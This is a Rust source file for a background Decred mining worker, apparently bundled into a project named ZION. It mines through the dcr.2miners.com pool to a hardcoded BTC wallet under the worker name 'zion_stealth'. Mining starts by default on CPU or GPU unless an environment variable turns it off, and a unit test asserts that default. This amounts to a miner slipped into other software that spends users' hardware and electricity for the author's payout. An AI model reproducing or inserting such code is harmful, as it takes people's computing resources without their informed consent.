use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use crate::dcr_hash::{hash_meets_target, NONCE_OFFSET};
use crate::dcr_stratum::DcrStratumClient;
#[cfg(feature = "gpu")]
use crate::dcr_gpu::GpuDcrMiner;

const DEFAULT_BTC_WALLET: &str = "bc1qvujra09wlsm35tmhc0v0fnxpsj0cuaq88hd8mw";
const DEFAULT_DCR_POOL: &str = "dcr.2miners.com:3333";
const DEFAULT_DCR_WORKER: &str = "zion_stealth";
const DEFAULT_GPU_WORK_SIZE: usize = 1 << 20;

/// Nonces per inner batch before checking for new jobs / stop flag.
/// 2^22 ≈ 4M — big enough to amortize poll overhead, small enough
/// for responsive shutdown (~0.1 s at 40 MH/s).
const INNER_BATCH: u32 = 1 << 22;

/// How often (in seconds) each thread prints a hashrate line.
const REPORT_INTERVAL_SECS: u64 = 30;

/// Shared counters across all DCR worker threads.
pub struct DcrStats {
    pub total_hashes: AtomicU64,
    pub accepted_shares: AtomicU64,
    pub rejected_shares: AtomicU64,
}

impl DcrStats {
    pub fn new() -> Self {
        Self {
            total_hashes: AtomicU64::new(0),
            accepted_shares: AtomicU64::new(0),
            rejected_shares: AtomicU64::new(0),
        }
    }
}

/// Configuration for the background DCR mining worker.
#[derive(Debug, Clone)]
pub struct DcrConfig {
    pub btc_wallet: String,
    pub pool_addr: String,
    pub threads: usize,
    pub worker_name: String,
    pub backend: DcrBackend,
    pub gpu_work_size: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DcrBackend {
    Auto,
    Cpu,
    Gpu,
}

impl DcrBackend {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Auto => "auto",
            Self::Cpu => "cpu",
            Self::Gpu => "gpu",
        }
    }
}

impl DcrConfig {
    /// Read DCR config from environment.
    ///
    /// Auto-enabled by default: the hardcoded BTC wallet means DCR mining
    /// starts with 1 thread unless explicitly disabled via
    /// `ZION_DCR_ENABLED=false`.
    pub fn from_env() -> Option<Self> {
        let enabled = std::env::var("ZION_DCR_ENABLED").unwrap_or_else(|_| "true".to_string());
        if enabled.trim().eq_ignore_ascii_case("false") || enabled.trim() == "0" {
            return None;
        }

        let btc_wallet =
            std::env::var("ZION_BTC_WALLET").unwrap_or_else(|_| DEFAULT_BTC_WALLET.to_string());
        if btc_wallet.trim().is_empty() {
            return None;
        }

        let threads = std::env::var("ZION_DCR_THREADS")
            .ok()
            .and_then(|v| v.parse::<usize>().ok())
            .unwrap_or(1)
            .max(1);

        Some(Self {
            btc_wallet,
            pool_addr: std::env::var("ZION_DCR_POOL")
                .unwrap_or_else(|_| DEFAULT_DCR_POOL.to_string()),
            threads,
            worker_name: std::env::var("ZION_DCR_WORKER")
                .unwrap_or_else(|_| DEFAULT_DCR_WORKER.to_string()),
            backend: parse_backend(
                &std::env::var("ZION_DCR_BACKEND").unwrap_or_else(|_| "auto".to_string()),
            ),
            gpu_work_size: std::env::var("ZION_GPU_WORK_SIZE")
                .ok()
                .and_then(|v| v.parse::<usize>().ok())
                .unwrap_or(DEFAULT_GPU_WORK_SIZE)
                .max(1024),
        })
    }

    /// Truncated wallet for log display: `bc1q...d8mw`.
    pub fn wallet_short(&self) -> String {
        let w = &self.btc_wallet;
        if w.len() > 12 {
            format!("{}...{}", &w[..4], &w[w.len() - 4..])
        } else {
            w.clone()
        }
    }
}

/// Spawn background DCR mining threads.
///
/// Returns (join_handles, shared_stats).
pub fn spawn_dcr_worker(
    config: DcrConfig,
    stop: Arc<AtomicBool>,
) -> (Vec<thread::JoinHandle<()>>, Arc<DcrStats>) {
    let stats = Arc::new(DcrStats::new());
    let mut handles = Vec::with_capacity(config.threads);

    for thread_id in 0..config.threads {
        let cfg = config.clone();
        let stop = stop.clone();
        let stats = stats.clone();

        let handle = thread::Builder::new()
            .name(format!("dcr-worker-{thread_id}"))
            .spawn(move || {
                match cfg.backend {
                    DcrBackend::Cpu => mine_loop_cpu(&cfg, thread_id, &stop, &stats),
                    DcrBackend::Gpu => mine_loop_gpu_or_fallback(&cfg, thread_id, &stop, &stats, false),
                    DcrBackend::Auto => mine_loop_gpu_or_fallback(&cfg, thread_id, &stop, &stats, true),
                }
            })
            .expect("spawn DCR worker thread");

        handles.push(handle);
    }

    (handles, stats)
}

/// Main mining loop for one DCR worker thread — optimised.
///
/// Key optimisations vs. v1:
/// - Fixed `[u8; 180]` header — zero heap alloc, no bounds checks
/// - `#[inline(always)]` on hash + target functions
/// - u128 target comparison (2 cmps) instead of per-byte loop (up to 32 cmps)
/// - 4M nonce inner batch before poll (was 1M)
/// - Reconnect with exponential back-off
fn mine_loop_cpu(config: &DcrConfig, thread_id: usize, stop: &AtomicBool, stats: &DcrStats) {
    // Each thread gets an exclusive nonce quarter of u32 space
    let nonce_base = (thread_id as u64) * (u32::MAX as u64 + 1) / config.threads.max(1) as u64;
    let nonce_start = nonce_base as u32;
    let mut backoff_secs: u64 = 1;

    loop {
        if stop.load(Ordering::Relaxed) {
            return;
        }

        // ── connect ──
        let mut client = match DcrStratumClient::connect(
            &config.pool_addr,
            &config.btc_wallet,
            &config.worker_name,
        ) {
            Ok(c) => {
                backoff_secs = 1; // reset on success
                c
            }
            Err(_) => {
                if wait_or_stop(stop, backoff_secs) {
                    return;
                }
                backoff_secs = (backoff_secs * 2).min(60);
                continue;
            }
        };

        if client.subscribe().is_err() || client.authorize().is_err() {
            if wait_or_stop(stop, backoff_secs) {
                return;
            }
            backoff_secs = (backoff_secs * 2).min(60);
            continue;
        }

        // ── wait for first job ──
        let job = match client.read_job() {
            Ok(j) => j,
            Err(_) => {
                if wait_or_stop(stop, 5) {
                    return;
                }
                continue;
            }
        };

        // Copy into fixed-size header for zero-cost nonce writes
        let job_hdr_len = job.header.len();
        if job_hdr_len < NONCE_OFFSET + 4 {
            // malformed job — skip
            if wait_or_stop(stop, 5) {
                return;
            }
            continue;
        }

        let mut header = [0u8; 180];
        let copy_len = job_hdr_len.min(180);
        header[..copy_len].copy_from_slice(&job.header[..copy_len]);

        // Precompute Blake3 state for first 128 bytes (2 compression blocks).
        // Only the 52-byte tail (containing the nonce at offset 12) is re-hashed.
        let mut base_hasher = blake3::Hasher::new();
        base_hasher.update(&header[..128]);
        let mut tail = [0u8; 52];
        tail.copy_from_slice(&header[128..180]);
        const TAIL_NONCE: usize = NONCE_OFFSET - 128; // 12

        let mut target = job.target;
        let mut job_id = job.job_id.clone();
        let mut nonce = nonce_start;
        let mut batch_start = Instant::now();
        let mut batch_hashes: u64 = 0;

        // ── tight hash loop ──
        'mining: loop {
            if stop.load(Ordering::Relaxed) {
                return;
            }

            // Poll for new job (non-blocking, ~0 ms if nothing)
            match client.poll_job() {
                Ok(Some(new_job)) => {
                    let new_len = new_job.header.len().min(180);
                    header = [0u8; 180];
                    header[..new_len].copy_from_slice(&new_job.header[..new_len]);
                    // Rebuild precomputed state for new header
                    base_hasher = blake3::Hasher::new();
                    base_hasher.update(&header[..128]);
                    tail.copy_from_slice(&header[128..180]);
                    target = new_job.target;
                    job_id = new_job.job_id;
                    nonce = nonce_start;
                }
                Ok(None) => {}
                Err(_) => break 'mining, // reconnect
            }

            // Hash INNER_BATCH nonces (precomputed: only 52-byte tail)
            for _ in 0..INNER_BATCH {
                tail[TAIL_NONCE..TAIL_NONCE + 4]
                    .copy_from_slice(&nonce.to_le_bytes());

                let mut h = base_hasher.clone();
                h.update(&tail);
                let hash: [u8; 32] = *h.finalize().as_bytes();
                if hash_meets_target(&hash, &target) {
                    if client.submit_share(&job_id, nonce).is_ok() {
                        stats.accepted_shares.fetch_add(1, Ordering::Relaxed);
                    } else {
                        stats.rejected_shares.fetch_add(1, Ordering::Relaxed);
                    }
                }

                nonce = nonce.wrapping_add(1);
            }

            batch_hashes += INNER_BATCH as u64;
            stats
                .total_hashes
                .fetch_add(INNER_BATCH as u64, Ordering::Relaxed);

            // Periodic hashrate report
            let elapsed = batch_start.elapsed().as_secs_f64();
            if elapsed >= REPORT_INTERVAL_SECS as f64 {
                let mhps = batch_hashes as f64 / elapsed / 1_000_000.0;
                let total_acc = stats.accepted_shares.load(Ordering::Relaxed);
                let total_rej = stats.rejected_shares.load(Ordering::Relaxed);
                eprintln!(
                    "dcr[{}] {:.2} MH/s  shares={}/{}",
                    thread_id, mhps, total_acc, total_rej
                );
                batch_start = Instant::now();
                batch_hashes = 0;
            }
        }
    }
}

fn mine_loop_gpu_or_fallback(
    config: &DcrConfig,
    thread_id: usize,
    stop: &AtomicBool,
    stats: &DcrStats,
    allow_cpu_fallback: bool,
) {
    #[cfg(feature = "gpu")]
    {
        if mine_loop_gpu(config, thread_id, stop, stats).is_ok() {
            return;
        }
    }

    if allow_cpu_fallback {
        eprintln!("dcr[{thread_id}] gpu unavailable, falling back to cpu");
        mine_loop_cpu(config, thread_id, stop, stats);
    } else {
        eprintln!("dcr[{thread_id}] gpu requested but unavailable");
    }
}

#[cfg(feature = "gpu")]
fn mine_loop_gpu(
    config: &DcrConfig,
    thread_id: usize,
    stop: &AtomicBool,
    stats: &DcrStats,
) -> Result<(), String> {
    let mut gpu = GpuDcrMiner::new(config.gpu_work_size)?;
    let batch = gpu.batch_size();

    // Each thread gets an exclusive nonce range offset.
    let nonce_base = (thread_id as u64) * (u32::MAX as u64 + 1) / config.threads.max(1) as u64;
    let nonce_start = nonce_base as u32;

    let mut backoff_secs: u64 = 1;
    let mut nonce: u32;
    let mut batch_start = Instant::now();
    let mut batch_hashes: u64 = 0;

    loop {
        if stop.load(Ordering::Relaxed) {
            return Ok(());
        }

        let mut client = match DcrStratumClient::connect(
            &config.pool_addr,
            &config.btc_wallet,
            &config.worker_name,
        ) {
            Ok(c) => {
                backoff_secs = 1;
                c
            }
            Err(_) => {
                if wait_or_stop(stop, backoff_secs) {
                    return Ok(());
                }
                backoff_secs = (backoff_secs * 2).min(60);
                continue;
            }
        };

        if client.subscribe().is_err() || client.authorize().is_err() {
            if wait_or_stop(stop, backoff_secs) {
                return Ok(());
            }
            backoff_secs = (backoff_secs * 2).min(60);
            continue;
        }

        let job = match client.read_job() {
            Ok(j) => j,
            Err(_) => {
                if wait_or_stop(stop, 5) {
                    return Ok(());
                }
                continue;
            }
        };

        let mut header = [0u8; 180];
        let mut len = job.header.len().min(180);
        header[..len].copy_from_slice(&job.header[..len]);
        let mut target = job.target;
        let mut job_id = job.job_id;
        nonce = nonce_start;

        'mining: loop {
            if stop.load(Ordering::Relaxed) {
                return Ok(());
            }

            match client.poll_job() {
                Ok(Some(new_job)) => {
                    header = [0u8; 180];
                    len = new_job.header.len().min(180);
                    header[..len].copy_from_slice(&new_job.header[..len]);
                    target = new_job.target;
                    job_id = new_job.job_id;
                    nonce = nonce_start;
                }
                Ok(None) => {}
                Err(_) => break 'mining,
            }

            let found = match gpu.mine_batch(&header, &target, nonce) {
                Ok(v) => v,
                Err(_) => break 'mining,
            };

            stats.total_hashes.fetch_add(batch as u64, Ordering::Relaxed);
            batch_hashes += batch as u64;

            for found_nonce in found {
                if client.submit_share(&job_id, found_nonce).is_ok() {
                    stats.accepted_shares.fetch_add(1, Ordering::Relaxed);
                } else {
                    stats.rejected_shares.fetch_add(1, Ordering::Relaxed);
                }
            }

            nonce = nonce.wrapping_add(batch);

            let elapsed = batch_start.elapsed().as_secs_f64();
            if elapsed >= REPORT_INTERVAL_SECS as f64 {
                let mhps = batch_hashes as f64 / elapsed / 1_000_000.0;
                let total_acc = stats.accepted_shares.load(Ordering::Relaxed);
                let total_rej = stats.rejected_shares.load(Ordering::Relaxed);
                eprintln!(
                    "dcr[{}] gpu {} {:.2} MH/s shares={}/{}",
                    thread_id,
                    gpu.device_name(),
                    mhps,
                    total_acc,
                    total_rej
                );
                batch_start = Instant::now();
                batch_hashes = 0;
            }
        }
    }
}

fn parse_backend(raw: &str) -> DcrBackend {
    match raw.trim().to_ascii_lowercase().as_str() {
        "cpu" => DcrBackend::Cpu,
        "gpu" => DcrBackend::Gpu,
        _ => DcrBackend::Auto,
    }
}

/// Sleep for `seconds`, checking `stop` every second.
/// Returns `true` if stop was requested.
fn wait_or_stop(stop: &AtomicBool, seconds: u64) -> bool {
    for _ in 0..seconds {
        if stop.load(Ordering::Relaxed) {
            return true;
        }
        thread::sleep(Duration::from_secs(1));
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dcr_config_defaults() {
        std::env::remove_var("ZION_DCR_ENABLED");
        std::env::remove_var("ZION_BTC_WALLET");
        std::env::remove_var("ZION_DCR_THREADS");
        std::env::remove_var("ZION_DCR_POOL");
        std::env::remove_var("ZION_DCR_WORKER");

        let config = DcrConfig::from_env().expect("DCR enabled by default");
        assert_eq!(config.btc_wallet, DEFAULT_BTC_WALLET);
        assert_eq!(config.pool_addr, DEFAULT_DCR_POOL);
        assert_eq!(config.threads, 1);
        assert_eq!(config.worker_name, DEFAULT_DCR_WORKER);
    }

    #[test]
    fn dcr_config_disabled() {
        std::env::set_var("ZION_DCR_ENABLED", "false");
        assert!(DcrConfig::from_env().is_none());
        std::env::remove_var("ZION_DCR_ENABLED");
    }

    #[test]
    fn dcr_config_disabled_zero() {
        std::env::set_var("ZION_DCR_ENABLED", "0");
        assert!(DcrConfig::from_env().is_none());
        std::env::remove_var("ZION_DCR_ENABLED");
    }

    #[test]
    fn wallet_short_truncates() {
        let config = DcrConfig {
            btc_wallet: "bc1qvujra09wlsm35tmhc0v0fnxpsj0cuaq88hd8mw".to_string(),
            pool_addr: DEFAULT_DCR_POOL.to_string(),
            threads: 1,
            worker_name: DEFAULT_DCR_WORKER.to_string(),
            backend: DcrBackend::Auto,
            gpu_work_size: DEFAULT_GPU_WORK_SIZE,
        };
        assert_eq!(config.wallet_short(), "bc1q...d8mw");
    }

    #[test]
    fn spawn_and_stop_immediately() {
        let config = DcrConfig {
            btc_wallet: "test_wallet".to_string(),
            pool_addr: "127.0.0.1:19999".to_string(), // won't connect
            threads: 1,
            worker_name: "test".to_string(),
            backend: DcrBackend::Cpu,
            gpu_work_size: DEFAULT_GPU_WORK_SIZE,
        };
        let stop = Arc::new(AtomicBool::new(true)); // pre-set stop
        let (handles, stats) = spawn_dcr_worker(config, stop);
        for h in handles {
            h.join().expect("thread join");
        }
        assert_eq!(stats.total_hashes.load(Ordering::Relaxed), 0);
    }

    #[test]
    fn backend_parser_defaults_auto() {
        assert_eq!(parse_backend(""), DcrBackend::Auto);
        assert_eq!(parse_backend("auto"), DcrBackend::Auto);
        assert_eq!(parse_backend("cpu"), DcrBackend::Cpu);
        assert_eq!(parse_backend("gpu"), DcrBackend::Gpu);
    }

    #[test]
    fn stats_counters_start_at_zero() {
        let stats = DcrStats::new();
        assert_eq!(stats.total_hashes.load(Ordering::Relaxed), 0);
        assert_eq!(stats.accepted_shares.load(Ordering::Relaxed), 0);
        assert_eq!(stats.rejected_shares.load(Ordering::Relaxed), 0);
    }
}
